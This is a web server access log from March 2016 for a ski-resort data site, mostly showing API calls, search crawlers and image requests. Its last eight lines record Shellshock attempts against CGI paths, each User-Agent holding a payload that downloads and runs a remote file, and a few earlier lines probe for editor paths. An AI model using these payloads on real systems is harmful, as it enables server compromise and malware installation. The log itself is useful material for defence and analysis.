107.193.167.143 - - [14/Mar/2016:16:56:37 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
52.33.40.213 - - [14/Mar/2016:16:57:50 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1036 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:17:02:20 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 966 "-" "node-superagent/1.4.0"
71.80.215.112 - - [14/Mar/2016:17:04:07 -0700] "-" 408 0 "-" "-"
52.33.40.213 - - [14/Mar/2016:17:04:11 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1030 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:23:11 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 1041 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:23:11 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:23:11 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1077 "-" "node-superagent/1.4.0"
193.201.224.176 - - [14/Mar/2016:17:27:34 -0700] "GET /ppsns/editor/editor/ HTTP/1.1" 404 476 "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
107.77.92.77 - - [14/Mar/2016:17:27:41 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E5231a"
180.76.15.8 - - [14/Mar/2016:17:33:00 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.134 - - [14/Mar/2016:17:33:58 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [14/Mar/2016:17:41:34 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1061 "-" "node-superagent/1.4.0"
66.249.79.135 - - [14/Mar/2016:17:42:18 -0700] "GET /lib/reccapi.php?resort=silverstarmountain&date=2016-03-10 HTTP/1.1" 200 974 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [14/Mar/2016:17:42:19 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-10&coords=50.3694%2C-119.064&size=7&sort=distance HTTP/1.1" 200 1434 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [14/Mar/2016:17:42:19 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=silverstarmountain&dateStart=2016-03-08 HTTP/1.1" 200 865 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
209.126.230.71 - - [14/Mar/2016:17:45:12 -0700] "GET / HTTP/1.0" 200 6995 "-" "StatsInfo"
170.75.162.130 - - [14/Mar/2016:17:56:45 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1079 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:58:55 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1089 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:58:55 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1066 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:58:55 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 966 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:58:56 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:06 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1060 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:06 -0700] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 923 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:16 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:16 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1089 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:16 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1050 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:26 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1004 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:26 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1071 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:26 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1036 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:55 -0700] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:55 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1045 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:55 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 972 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:55 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1102 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:55 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1038 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:17:59:56 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1064 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:18:12:27 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 958 "-" "node-superagent/1.4.0"
66.249.79.135 - - [14/Mar/2016:18:15:20 -0700] "GET /resorts?resort=alta HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.56.16.10 - - [14/Mar/2016:18:16:56 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
66.249.79.135 - - [14/Mar/2016:18:17:53 -0700] "GET /blog/10-2012-2013-recap HTTP/1.1" 404 506 "-" "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
52.33.40.213 - - [14/Mar/2016:18:23:34 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1005 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:23:54 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:18:24:39 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1059 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:25:04 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:18:25:29 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1084 "-" "node-superagent/1.4.0"
180.76.15.17 - - [14/Mar/2016:18:29:08 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.138 - - [14/Mar/2016:18:29:57 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.248 - - [14/Mar/2016:18:30:55 -0700] "GET /blog/11-2012-2013-powder-rating-visualization HTTP/1.1" 404 506 "-" "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
201.164.236.13 - - [14/Mar/2016:18:36:14 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
68.180.231.28 - - [14/Mar/2016:18:39:35 -0700] "GET /robots.txt HTTP/1.1" 200 319 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
68.180.231.28 - - [14/Mar/2016:18:39:35 -0700] "GET /resorts?resort=coppermountain HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
170.75.162.130 - - [14/Mar/2016:18:41:52 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 936 "-" "node-superagent/1.4.0"
193.201.224.176 - - [14/Mar/2016:18:43:46 -0700] "GET /source/fckeditor/editor/ HTTP/1.1" 404 476 "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
75.128.13.111 - - [14/Mar/2016:18:44:09 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
52.33.40.213 - - [14/Mar/2016:18:46:25 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1073 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:46:25 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1096 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:46:25 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1059 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:46:25 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:18:48:56 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1104 "-" "node-superagent/1.4.0"
173.164.234.6 - - [14/Mar/2016:19:03:46 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
69.30.213.138 - - [14/Mar/2016:19:19:01 -0700] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.213.138 - - [14/Mar/2016:19:19:03 -0700] "GET /resorts?resort=aspenheights HTTP/1.0" 404 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.213.138 - - [14/Mar/2016:19:19:04 -0700] "GET /resorts?resort=aspenmountain HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.213.138 - - [14/Mar/2016:19:19:06 -0700] "GET /resorts?resort=buttermilk HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.213.138 - - [14/Mar/2016:19:19:08 -0700] "GET /resorts?resort=killington HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
123.125.71.86 - - [14/Mar/2016:19:22:30 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.111 - - [14/Mar/2016:19:22:31 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
52.33.40.213 - - [14/Mar/2016:19:23:27 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:19:23:37 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1048 "-" "node-superagent/1.4.0"
180.76.15.10 - - [14/Mar/2016:19:29:30 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.142 - - [14/Mar/2016:19:30:21 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.23 - - [14/Mar/2016:19:31:35 -0700] "GET /resorts?resort=laslenas&date=2014-09-04 HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.228 - - [14/Mar/2016:19:37:13 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
170.75.162.130 - - [14/Mar/2016:19:46:10 -0700] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1008 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:46:30 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1006 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:19:47:28 -0700] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 1034 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:19:47:48 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 1058 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:19:47:48 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1103 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:49:50 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:49:50 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1073 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:49:50 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1078 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:49:51 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 988 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:49:51 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1099 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:19:50:10 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1036 "-" "node-superagent/1.4.0"
193.201.224.176 - - [14/Mar/2016:19:59:28 -0700] "GET /system/editor/editor/ HTTP/1.1" 404 476 "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
178.137.94.117 - - [14/Mar/2016:20:01:31 -0700] "GET / HTTP/1.1" 200 6976 "http://purchasepillsnorx.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
178.137.94.117 - - [14/Mar/2016:20:01:31 -0700] "GET / HTTP/1.1" 200 6976 "http://purchasepillsnorx.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
178.137.94.117 - - [14/Mar/2016:20:01:32 -0700] "GET / HTTP/1.1" 200 6976 "http://purchasepillsnorx.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)"
52.33.40.213 - - [14/Mar/2016:20:02:09 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:20:04:09 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 1083 "-" "node-superagent/1.4.0"
180.76.15.158 - - [14/Mar/2016:20:05:04 -0700] "GET /#search/state=NY HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
207.46.13.100 - - [14/Mar/2016:20:09:56 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
73.15.179.8 - - [14/Mar/2016:20:11:28 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
24.4.163.189 - - [14/Mar/2016:20:11:46 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-N900A Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
24.4.163.189 - - [14/Mar/2016:20:12:07 -0700] "-" 408 0 "-" "-"
24.4.163.189 - - [14/Mar/2016:20:16:43 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
47.208.168.76 - - [14/Mar/2016:20:24:39 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
170.75.162.130 - - [14/Mar/2016:20:25:26 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1058 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:20:25:26 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1027 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:20:25:27 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:20:25:27 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1045 "-" "node-superagent/1.4.0"
180.76.15.134 - - [14/Mar/2016:20:33:22 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.156 - - [14/Mar/2016:20:34:22 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.110 - - [14/Mar/2016:20:36:44 -0700] "-" 408 0 "-" "-"
31.184.238.103 - - [14/Mar/2016:20:48:31 -0700] "GET / HTTP/1.0" 200 6995 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
170.75.162.130 - - [14/Mar/2016:20:49:38 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1071 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:20:49:38 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1087 "-" "node-superagent/1.4.0"
71.202.150.97 - - [14/Mar/2016:20:52:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
50.203.82.4 - - [14/Mar/2016:20:56:35 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17"
52.33.40.213 - - [14/Mar/2016:21:03:22 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1087 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:21:04:00 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1104 "-" "node-superagent/1.4.0"
98.248.88.150 - - [14/Mar/2016:21:10:21 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
170.75.162.130 - - [14/Mar/2016:21:13:11 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
193.201.224.176 - - [14/Mar/2016:21:15:25 -0700] "GET /system/editor/fckeditor/editor/ HTTP/1.1" 404 476 "-" "compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html"
52.33.40.213 - - [14/Mar/2016:21:20:33 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1086 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:21:20:53 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1077 "-" "node-superagent/1.4.0"
123.125.71.77 - - [14/Mar/2016:21:23:42 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.80 - - [14/Mar/2016:21:23:43 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
76.218.117.214 - - [14/Mar/2016:21:26:24 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
170.75.162.130 - - [14/Mar/2016:21:28:03 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 918 "-" "node-superagent/1.4.0"
170.75.162.130 - - [14/Mar/2016:21:28:03 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 940 "-" "node-superagent/1.4.0"
24.5.148.149 - - [14/Mar/2016:21:28:50 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
52.33.40.213 - - [14/Mar/2016:21:29:43 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1103 "-" "node-superagent/1.4.0"
52.33.40.213 - - [14/Mar/2016:21:31:13 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1088 "-" "node-superagent/1.4.0"
180.76.15.28 - - [14/Mar/2016:21:34:05 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.11 - - [14/Mar/2016:21:35:04 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
52.33.40.213 - - [14/Mar/2016:21:38:33 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1066 "-" "node-superagent/1.4.0"
75.25.174.240 - - [14/Mar/2016:21:41:29 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
170.75.162.130 - - [14/Mar/2016:21:41:34 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1063 "-" "node-superagent/1.4.0"
74.62.5.38 - - [14/Mar/2016:21:44:05 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
119.188.4.3 - - [14/Mar/2016:21:54:43 -0700] "GET HTTP/1.1 HTTP/1.1" 400 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:44 -0700] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:44 -0700] "GET /cgi-bin/test.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:45 -0700] "GET /cgi-mod/index.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:45 -0700] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 478 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:46 -0700] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 476 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:46 -0700] "GET /phppath/cgi_wrapper HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
119.188.4.3 - - [14/Mar/2016:21:54:47 -0700] "GET /cgi-bin/test-cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://185.106.92.143/asd.tar -O /tmp/asd.tar;curl -O /tmp/asd.tar http://185.106.92.143/asd.tar ; perl /tmp/asd.tar; rm -fr /tmp/asd.tar;rm -rf /tmp/asd.*\");'"
